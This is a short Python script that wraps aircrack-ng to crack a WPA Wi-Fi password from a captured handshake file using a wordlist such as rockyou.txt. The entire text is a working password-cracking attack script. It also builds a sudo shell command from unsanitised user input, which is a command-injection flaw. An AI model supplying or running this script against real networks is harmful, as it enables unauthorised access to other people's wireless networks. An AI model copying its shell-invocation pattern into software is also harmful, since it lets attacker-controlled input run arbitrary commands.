import os

def crack_handshake():
    handshake_file = input("Enter WPA handshake file (e.g., handshake-01.cap): ")
    wordlist = input("Enter path to wordlist (e.g., /usr/share/wordlists/rockyou.txt): ")

    print("Cracking WPA password...")
    os.system(f"sudo aircrack-ng {handshake_file} -w {wordlist}")
